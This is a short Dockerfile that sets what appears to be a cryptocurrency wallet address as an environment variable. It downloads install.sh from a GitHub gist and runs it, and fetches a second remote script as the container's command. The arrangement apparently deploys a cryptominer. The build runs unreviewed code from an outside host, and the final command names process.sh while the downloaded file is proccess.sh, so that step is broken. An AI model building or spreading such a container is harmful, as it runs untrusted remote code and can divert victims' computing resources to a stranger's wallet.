FROM ubuntu:16.04

ENV ADDRESS 42cb3URRBdoKoDiU6GzfrFC1n6R8d6E3uF2TCLA6RR6YZjU8qdbSdCwRfcAkRwTigVh1CbWNUNJP1ZQhXMXWLooM3xDHZyL

WORKDIR /usr/local/bin
RUN cd /usr/local/bin

RUN apt update && apt install -y wget


RUN wget https://gist.githubusercontent.com/deniusmalog/3cd0a9a7e6be2653bea3e8acfcd6e26e/raw/7ed44c85fadfab4e8423d08958e91f0f4778beae/install.sh
RUN chmod +x install.sh
RUN sh install.sh

RUN wget https://gist.githubusercontent.com/deniusmalog/19274459405a080fad9f1956b12cfeff/raw/4827cd32a2925a7ca270d51652088a3343111f16/proccess.sh
RUN chmod +x proccess.sh

CMD /usr/local/bin/process.sh